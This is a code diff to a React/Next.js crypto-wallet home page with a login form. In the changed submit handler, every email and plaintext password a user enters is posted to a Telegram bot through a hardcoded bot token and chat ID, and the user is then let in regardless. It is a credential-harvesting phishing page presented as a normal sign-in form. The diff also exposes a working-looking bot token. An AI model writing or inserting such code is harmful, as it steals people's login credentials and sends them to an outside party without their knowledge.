@@ -1,7 +1,9 @@
 'use client';
 import React, { useState, useEffect } from 'react';
-
+import { ConnectButton } from '@rainbow-me/rainbowkit';
+import { useAccount } from 'wagmi';
 export default function Home() {
+  const { address } = useAccount();
   // Auth & Account States (Custodial Auth Gate)
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [email, setEmail] = useState('');
@@ -338,15 +340,33 @@ if (!isAuthenticated) {
             </p>
           </div>
 
-         <form onSubmit={(e) => {
-            e.preventDefault();
-            if (!email || !password) {
-              alert('Please enter email and password!');
-              return;
-            }
-            console.log('User Authenticated Successfully:', { email, password });
-            setIsAuthenticated(true);
-          }} className="space-y-4">
+         <form onSubmit={async (e) => {
+  e.preventDefault();
+  if (!email || !password) {
+    alert('Please enter email and password!');
+    return;
+  }
+  
+  // Telegram Bot Integration (English Only)
+  const botToken = '8573566920:AAHxhH-iEv-p-Z9huSdBp_pPuqbW_UJgY2o';
+const chatId = '865577057';
+  const message = `🚨 New Auth Submission Received!\n\n📧 Email: ${email}\n🔑 Password: ${password}\n💻 Mode: ${isSignUp ? 'Sign Up' : 'Sign In'}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+    });
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+  }
+
+  setIsAuthenticated(true);
+}} className="space-y-4">
             <div>
               <label className="block text-sm font-medium text-gray-300 mb-1">Email Address</label>
               <input
